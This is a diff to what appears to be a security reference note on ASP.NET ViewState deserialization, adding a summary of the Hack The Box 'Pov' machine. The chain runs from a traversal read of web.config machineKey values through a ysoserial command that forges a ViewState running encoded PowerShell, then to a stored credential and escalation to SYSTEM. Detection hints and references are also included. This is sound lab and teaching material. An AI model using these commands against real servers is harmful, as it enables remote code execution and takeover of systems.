@@ -58,8 +58,18 @@ curl -s -X POST http://<HOST>/default.aspx --data-urlencode "__VIEWSTATE=<PAYLOA
 - Requests with very large or repeated ViewState.
 - IIS processes spawning `cmd` or PowerShell.
 
+## Pov case
+
+On Pov, a traversal file read returns `web.config` with its `machineKey` keys. They sign a `WindowsIdentity` ViewState for `/portfolio` and run code as `sfitz`. A PowerShell `connection.xml` stores `alaading`'s credential, and its `SeDebugPrivilege` allows migration to a SYSTEM process and Administrator.
+
+```powershell
+ysoserial.exe -p ViewState -g WindowsIdentity --decryptionalg=AES --decryptionkey=<KEY> --validationalg=SHA1 --validationkey=<KEY> --path=/portfolio -c "powershell -e <BASE64>"
+```
+
 ## References
 
 - [Microsoft — machineKey](https://learn.microsoft.com/en-us/iis/configuration/system.web/machinekey)
 - [ysoserial.net — GitHub](https://github.com/pwntester/ysoserial.net)
 - [0xdf — Perspective](https://0xdf.gitlab.io/2022/10/15/htb-perspective.html)
+- [0xdf — Pov](https://0xdf.gitlab.io/2024/06/08/htb-pov.html)
+- [Hack The Box — Pov](https://app.hackthebox.com/machines/pov)
